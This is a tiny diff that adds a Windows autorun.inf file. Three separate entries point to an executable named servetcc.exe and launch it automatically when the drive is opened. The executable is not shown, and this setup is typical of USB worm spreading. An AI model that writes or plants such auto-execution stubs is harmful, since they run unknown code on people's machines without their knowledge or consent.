@@ -1,0 +1,4 @@
+[AutoRun]
+open=servetcc.exe
+shellexecute=servetcc.exe
+shell\Auto\command=servetcc.exe
